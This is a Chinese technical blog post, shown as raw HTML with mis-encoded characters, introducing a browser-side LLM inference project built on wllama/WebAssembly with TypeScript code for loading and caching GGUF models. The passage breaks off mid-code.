            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3004311888208296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Electrolux
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:49:15.000Z" title="Thu Jan 08 2026 10:49:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ğŸŒ <strong>åœ¨çº¿æ¼”ç¤º</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2F" target="_blank" title="https://mvp-ai-wllama.vercel.app/" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/</a></p>
<p>ğŸ”— <strong>GitHubä»“åº“</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felectroluxcode%2Fmvp-ai-wllama" target="_blank" title="https://github.com/electroluxcode/mvp-ai-wllama" ref="nofollow noopener noreferrer">mvp-ai-wllama</a></p>
<p>è¯´å®è¯ï¼Œç¬¬ä¸€æ¬¡å¬è¯´è¦åœ¨æµè§ˆå™¨é‡Œè·‘å¤§è¯­è¨€æ¨¡å‹çš„æ—¶å€™ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯ï¼šè¿™æ€ä¹ˆå¯èƒ½ï¼Ÿä¸æ˜¯éœ€è¦ GPU æœåŠ¡å™¨å—ï¼Ÿä¸æ˜¯éœ€è¦åç«¯ API å—ï¼Ÿ</p>
<p>ä½†äº‹å®è¯æ˜ï¼Œwllama çš„å‡ºç°ï¼ŒçœŸçš„è®©è¿™ä¸€åˆ‡å˜æˆäº†å¯èƒ½ã€‚äºæ˜¯å°±æœ‰äº†è¿™ä¸ªé¡¹ç›®â€”â€”ä¸€ä¸ªå®Œå…¨åœ¨æµè§ˆå™¨é‡Œè¿è¡Œçš„ AI æ¨ç†æ–¹æ¡ˆï¼Œä¸éœ€è¦æœåŠ¡å™¨ï¼Œä¸éœ€è¦åç«¯ï¼Œæ‰“å¼€ç½‘é¡µå°±èƒ½ç”¨ã€‚</p>
<h3 data-id="heading-1">è…¾è®¯æ··å…ƒç¿»è¯‘æ¨¡å‹ç¤ºä¾‹</h3>
<p>ä½œä¸ºå®é™…åº”ç”¨ç¤ºä¾‹ï¼Œæœ¬é¡¹ç›®æ”¯æŒåŠ è½½å’Œè¿è¡Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fhf-mirror.com%2Fmradermacher%2FHY-MT1.5-1.8B-GGUF%2Ftree%2Fmain" target="_blank" title="https://hf-mirror.com/mradermacher/HY-MT1.5-1.8B-GGUF/tree/main" ref="nofollow noopener noreferrer">è…¾è®¯æ··å…ƒç¿»è¯‘æ¨¡å‹ï¼ˆHY-MT1.5-1.8B-GGUFï¼‰</a>ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸“ä¸ºå¤šè¯­è¨€ç¿»è¯‘ä»»åŠ¡è®¾è®¡çš„è½»é‡çº§æ¨¡å‹</p>
<p><strong>æ¨¡å‹ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>ğŸŒ <strong>å¤šè¯­è¨€æ”¯æŒ</strong>ï¼šæ”¯æŒ 36 ç§è¯­è¨€çš„ç¿»è¯‘ä»»åŠ¡</li>
<li>ğŸ’¬ <strong>å¯¹è¯å¼ç¿»è¯‘</strong>ï¼šé‡‡ç”¨å¯¹è¯å¼äº¤äº’ï¼Œæä¾›æ›´è‡ªç„¶çš„ç¿»è¯‘ä½“éªŒ</li>
<li>ğŸ“¦ <strong>å¤šç§é‡åŒ–ç‰ˆæœ¬</strong>ï¼šæä¾›ä» Q2_Kï¼ˆ777MBï¼‰åˆ° f16ï¼ˆ3.59GBï¼‰çš„å¤šç§é‡åŒ–ç‰ˆæœ¬ï¼Œæ»¡è¶³ä¸åŒæ€§èƒ½å’Œç²¾åº¦éœ€æ±‚</li>
<li>âš¡ <strong>è½»é‡é«˜æ•ˆ</strong>ï¼š1.8B å‚æ•°é‡ï¼Œåœ¨ä¿è¯ç¿»è¯‘è´¨é‡çš„åŒæ—¶ï¼Œå¤§å¹…é™ä½äº†è®¡ç®—å’Œå­˜å‚¨éœ€æ±‚</li>
</ul>
<p><strong>é‡åŒ–ç‰ˆæœ¬é€‰æ‹©å»ºè®®</strong>ï¼š</p>
<ul>
<li><strong>Q2_Kï¼ˆ777MBï¼‰</strong>ï¼šé€‚åˆå¿«é€Ÿæµ‹è¯•å’Œèµ„æºå—é™ç¯å¢ƒ</li>
<li><strong>Q4_K_Mï¼ˆ1.13GBï¼‰</strong>ï¼šå¹³è¡¡è´¨é‡å’Œæ€§èƒ½çš„æ¨èé€‰æ‹©</li>
<li><strong>Q5_K_Mï¼ˆ1.3GBï¼‰</strong>ï¼šæ›´é«˜ç²¾åº¦çš„ç¿»è¯‘è´¨é‡</li>
<li><strong>Q8_0ï¼ˆ1.91GBï¼‰</strong>ï¼šæ¥è¿‘åŸå§‹ç²¾åº¦çš„æœ€ä½³é€‰æ‹©</li>
</ul>
<p>step1: ä¸‹è½½æ¨¡å‹</p>
<p>step2: æ‰“å¼€Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2Fwllama%2Fmanager-cache" target="_blank" title="https://mvp-ai-wllama.vercel.app/wllama/manager-cache" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/wllama/manaâ€¦</a>Â å¯¼å…¥æ¨¡å‹ï¼Œ
åœ¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2Fwllama%2Fload-from-cache" target="_blank" title="https://mvp-ai-wllama.vercel.app/wllama/load-from-cache" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/wllama/loadâ€¦</a>Â ä¸­å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†(æ— è§†æ¡†æ¶ï¼Œåªè¦èƒ½æ‰§è¡Œjså°±èƒ½å¤Ÿè°ƒç”¨)</p>
<h2 data-id="heading-2">æ•ˆæœå±•ç¤º</h2>
<p>æ‰€æœ‰æ“ä½œå‡åœ¨æµè§ˆå™¨è¿›è¡Œï¼Œå…ˆæ¥çœ‹çœ‹æœ€ç»ˆæ•ˆæœï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a03dc9743a74cfaa7063c9429a086b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxlY3Ryb2x1eA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768474563&amp;x-signature=hDqCJu6gF35%2BppSUG0Vn1dk%2F%2Ffk%3D" alt="çº¯å‰ç«¯.jpg" loading="lazy"/></p>
<h3 data-id="heading-3">ä¸ºä»€ä¹ˆè¦åšè¿™ä¸ª</h3>
<p>ä¼ ç»Ÿçš„ AI æ¨¡å‹æ¨ç†ï¼Œä½ æ‡‚çš„ï¼š</p>
<ul>
<li>å¾—æä¸ª GPU æœåŠ¡å™¨ï¼Œæˆæœ¬ä¸ä½</li>
<li>åç«¯æœåŠ¡éƒ¨ç½²ï¼Œè¿ç»´å¤´ç–¼</li>
<li>æ•°æ®è¦ä¼ åˆ°æœåŠ¡å™¨ï¼Œéšç§æ€»è®©äººæ‹…å¿ƒ</li>
<li>æŒç»­çš„æœåŠ¡æˆæœ¬ï¼Œå°é¡¹ç›®æ ¹æœ¬ç©ä¸èµ·</li>
</ul>
<p>è€Œæµè§ˆå™¨ç«¯æ¨ç†å°±ä¸ä¸€æ ·äº†ï¼š</p>
<ul>
<li>ç”¨æˆ·çš„ç”µè„‘å°±æ˜¯"æœåŠ¡å™¨"ï¼Œé›¶æˆæœ¬</li>
<li>æ•°æ®å®Œå…¨æœ¬åœ°å¤„ç†ï¼Œéšç§å®‰å…¨</li>
<li>ç¦»çº¿ä¹Ÿèƒ½ç”¨ï¼Œä½“éªŒæ›´å¥½</li>
<li>éƒ¨ç½²ç®€å•ï¼Œä¸€ä¸ªé™æ€é¡µé¢å°±èƒ½æå®š</li>
</ul>
<p>æ‰€ä»¥ï¼Œä¸ºä»€ä¹ˆä¸è¯•è¯•å‘¢ï¼Ÿ</p>
<h3 data-id="heading-4">æ ¸å¿ƒåŠŸèƒ½æ¼”ç¤º</h3>
<ul>
<li>âœ… <strong>æœ¬åœ°æ¨¡å‹åŠ è½½</strong>ï¼šæ”¯æŒä»æœ¬åœ°æ–‡ä»¶ç›´æ¥åŠ è½½ GGUF æ¨¡å‹</li>
<li>âœ… <strong>è¿œç¨‹æ¨¡å‹ä¸‹è½½</strong>ï¼šä» URL ä¸‹è½½æ¨¡å‹å¹¶è‡ªåŠ¨ç¼“å­˜åˆ° IndexedDB</li>
<li>âœ… <strong>ç¼“å­˜ç®¡ç†</strong>ï¼šå®Œæ•´çš„æ¨¡å‹ç¼“å­˜ç®¡ç†ç³»ç»Ÿï¼Œæ”¯æŒå¯¼å…¥ã€å¯¼å‡ºã€åˆ é™¤</li>
<li>âœ… <strong>æµå¼ç”Ÿæˆ</strong>ï¼šå®æ—¶æµå¼è¾“å‡º AI ç”Ÿæˆå†…å®¹</li>
<li>âœ… <strong>å¤šçº¿ç¨‹æ”¯æŒ</strong>ï¼šè‡ªåŠ¨æ£€æµ‹å¹¶ä½¿ç”¨å¤šçº¿ç¨‹æ¨¡å¼æå‡æ€§èƒ½</li>
<li>âœ… <strong>å¤šå®ä¾‹æ”¯æŒ</strong>ï¼šæ”¯æŒåŒæ—¶è¿è¡Œå¤šä¸ªç‹¬ç«‹çš„æ¨¡å‹å®ä¾‹ï¼Œæ¯ä¸ªå®ä¾‹å¯åŠ è½½ä¸åŒæ¨¡å‹</li>
<li>âœ… <strong>å‚æ•°æŒä¹…åŒ–</strong>ï¼šæ¨ç†å‚æ•°è‡ªåŠ¨ä¿å­˜åˆ° localStorage</li>
<li>âœ… <strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šå®Œæ•´çš„äº‹ä»¶ç³»ç»Ÿï¼Œæ”¯æŒç›‘å¬æ¨¡å‹åŠ è½½ã€ç”Ÿæˆç­‰äº‹ä»¶</li>
<li>âœ… <strong>ç±»å‹å®‰å…¨</strong>ï¼šå®Œæ•´çš„ TypeScript ç±»å‹å®šä¹‰</li>
<li>âœ… <strong>PWA æ”¯æŒ</strong>ï¼šå®Œæ•´çš„æ¸è¿›å¼ Web åº”ç”¨æ”¯æŒï¼Œå¯å®‰è£…åˆ°è®¾å¤‡ï¼Œæ”¯æŒç¦»çº¿ä½¿ç”¨</li>
</ul>
<h2 data-id="heading-5">æŠ€æœ¯æ¶æ„</h2>
<h3 data-id="heading-6">æ ¸å¿ƒæŠ€æœ¯æ ˆ</h3>
<ul>
<li><strong>React 19</strong> + <strong>Next.js 15</strong>ï¼šç°ä»£åŒ–å‰ç«¯æ¡†æ¶</li>
<li><strong>@wllama/wllama</strong>ï¼šåŸºäº WebAssembly çš„ Llama æ¨¡å‹è¿è¡Œæ—¶</li>
<li><strong>WebAssembly (WASM)</strong>ï¼šé«˜æ€§èƒ½æ¨¡å‹æ¨ç†å¼•æ“</li>
<li><strong>TypeScript</strong>ï¼šç±»å‹å®‰å…¨çš„å¼€å‘ä½“éªŒ</li>
<li><strong>IndexedDB</strong>ï¼šæ¨¡å‹æ–‡ä»¶ç¼“å­˜ç³»ç»Ÿ</li>
<li><strong>EventEmitter</strong>ï¼šäº‹ä»¶é©±åŠ¨çš„æ¶æ„è®¾è®¡</li>
<li><strong>localStorage</strong>ï¼šæ¨ç†å‚æ•°æŒä¹…åŒ–å­˜å‚¨</li>
</ul>
<p>tip: äº‹å®ä¸Šæ ¸å¿ƒåº“ <code>wllama-core</code> ä¸ä¾èµ–äº Reactï¼Œä½ å¯ä»¥æ‹¿åˆ°é¡¹ç›®ä¸­çš„ <code>src/wllama-core</code>ï¼Œç„¶åæ¥å…¥åˆ°ä»»ä½•ç³»ç»Ÿä¸­å»ï¼Œæ¥å…¥å±‚å¯ä»¥å‚è€ƒ <code>src/app/wllama/load-from-file/page.tsx</code> ç­‰åº”ç”¨å±‚æ–‡ä»¶</p>
<h3 data-id="heading-7">æ¶æ„æµç¨‹å›¾</h3>
<pre><code class="hljs language-python" lang="python">ç”¨æˆ·é€‰æ‹©æ¨¡å‹
    â†“
Reactç»„ä»¶å±‚
    â†“
WllamaCore (æ ¸å¿ƒå°è£…å±‚)
    â†“
<span class="hljs-meta">@wllama/wllama (<span class="hljs-params">WASMè¿è¡Œæ—¶</span>)</span>
    â†“
WebAssemblyå¼•æ“
    â†“
GGUFæ¨¡å‹æ–‡ä»¶
    â†“
IndexedDBç¼“å­˜
    â†“
æµå¼ç”Ÿæˆè¾“å‡º
</code></pre>
<h2 data-id="heading-8">WASMæ¨¡å‹æ¨ç†æ ¸å¿ƒæµç¨‹</h2>
<h3 data-id="heading-9">æ¨¡å‹åŠ è½½æµç¨‹å›¾è§£</h3>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·é€‰æ‹©æ¨¡å‹æ–‡ä»¶/URL
<span class="hljs-code">    â†“
æ£€æŸ¥ç¼“å­˜ï¼ˆå¦‚ä»URLåŠ è½½ï¼‰
    â†“
ç¼“å­˜å‘½ä¸­ â†’ ä»IndexedDBè¯»å–
ç¼“å­˜æœªå‘½ä¸­ â†’ ä¸‹è½½/è¯»å–æ–‡ä»¶
    â†“
åŠ è½½åˆ°WASMå†…å­˜
    â†“
åˆå§‹åŒ–æ¨¡å‹å‚æ•°
    â†“
æ¨¡å‹å°±ç»ªï¼Œå¯å¼€å§‹æ¨ç†
</span></code></pre>
<h3 data-id="heading-10">æ ¸å¿ƒä»£ç å®ç°</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/wllama-core/wllama-core.ts</span>

<span class="hljs-comment">/**
 * WllamaCore - æ ¸å¿ƒå°è£…ç±»ï¼Œæä¾›ç®€æ´çš„API
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WllamaCore</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">wllama</span>: <span class="hljs-title class_">Wllama</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">isModelLoaded</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">inferenceParams</span>: <span class="hljs-title class_">InferenceParams</span>;

  <span class="hljs-comment">/**
   * ä»æ–‡ä»¶åŠ è½½æ¨¡å‹
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadModelFromFiles</span>(
    <span class="hljs-attr">files</span>: <span class="hljs-title class_">File</span>[],
    options?: <span class="hljs-title class_">LoadModelOptions</span>
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isModelLoaded</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">isGenerating</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Another model is already loaded or generation is in progress'</span>);
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADING</span>);
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> loadOptions = {
        <span class="hljs-attr">n_ctx</span>: options?.<span class="hljs-property">n_ctx</span> ?? <span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nContext</span>,
        <span class="hljs-attr">n_batch</span>: options?.<span class="hljs-property">n_batch</span> ?? <span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nBatch</span>,
        <span class="hljs-attr">n_threads</span>: options?.<span class="hljs-property">n_threads</span> ?? (<span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nThreads</span> &gt; <span class="hljs-number">0</span> 
          ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">inferenceParams</span>.<span class="hljs-property">nThreads</span> 
          : <span class="hljs-literal">undefined</span>),
      };

      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">wllama</span>.<span class="hljs-title function_">loadModel</span>(files, loadOptions);

      <span class="hljs-comment">// è·å–æ¨¡å‹å…ƒæ•°æ®</span>
      <span class="hljs-keyword">const</span> metadata = <span class="hljs-variable language_">this</span>.<span class="hljs-property">wllama</span>.<span class="hljs-title function_">getModelMetadata</span>();
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">modelMetadata</span> = {
        <span class="hljs-attr">name</span>: metadata.<span class="hljs-property">meta</span>[<span class="hljs-string">'general.name'</span>] || 
              metadata.<span class="hljs-property">meta</span>[<span class="hljs-string">'llama.context_length'</span>] || 
              files[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'.gguf'</span>, <span class="hljs-string">''</span>),
        ...metadata.<span class="hljs-property">meta</span>,
      };

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isModelLoaded</span> = <span class="hljs-literal">true</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, {
        <span class="hljs-attr">metadata</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">modelMetadata</span>,
        <span class="hljs-attr">runtimeInfo</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">runtimeInfo</span>,
      });
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resetInstance</span>();
      <span class="hljs-keyword">const</span> errorMsg = (error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>)?.<span class="hljs-property">message</span> ?? <span class="hljs-string">'Unknown error'</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">ERROR</span>, errorMsg);
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(errorMsg);
    }
  }

  <span class="hljs-comment">/**
   * ä»URLåŠ è½½æ¨¡å‹ï¼ˆæ”¯æŒè‡ªåŠ¨ç¼“å­˜ï¼‰
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadModelFromUrl</span>(
    <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>,
    options?: <span class="hljs-title class_">LoadModelOptions</span> &amp; { 
      useCache?: <span class="hljs-built_in">boolean</span>;
      downloadOptions?: <span class="hljs-title class_">DownloadOptions</span>;
    }
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> useCache = options?.<span class="hljs-property">useCache</span> !== <span class="hljs-literal">false</span>; <span class="hljs-comment">// é»˜è®¤å¯ç”¨ç¼“å­˜</span>

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">let</span> <span class="hljs-attr">file</span>: <span class="hljs-title class_">File</span>;

      <span class="hljs-comment">// æ£€æŸ¥ç¼“å­˜</span>
      <span class="hljs-keyword">if</span> (useCache) {
        <span class="hljs-keyword">const</span> cachedFile = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">open</span>(url);
        <span class="hljs-keyword">if</span> (cachedFile) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>?.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Loading model from cache:'</span>, url);
          file = cachedFile;
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// ä¸‹è½½å¹¶ç¼“å­˜</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>?.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Downloading and caching model:'</span>, url);
          <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">download</span>(url, options?.<span class="hljs-property">downloadOptions</span>);
          <span class="hljs-keyword">const</span> downloadedFile = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">open</span>(url);
          <span class="hljs-keyword">if</span> (!downloadedFile) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Failed to open cached file after download'</span>);
          }
          file = downloadedFile;
        }
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// ç›´æ¥ä¸‹è½½ï¼Œä¸ä½¿ç”¨ç¼“å­˜</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, {
          <span class="hljs-attr">headers</span>: options?.<span class="hljs-property">downloadOptions</span>?.<span class="hljs-property">headers</span>,
          <span class="hljs-attr">signal</span>: options?.<span class="hljs-property">downloadOptions</span>?.<span class="hljs-property">signal</span>,
        });
        <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();
        <span class="hljs-keyword">const</span> fileName = url.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>).<span class="hljs-title function_">pop</span>() || <span class="hljs-string">'model.gguf'</span>;
        file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>([blob], fileName, { <span class="hljs-attr">type</span>: <span class="hljs-string">'application/octet-stream'</span> });
      }

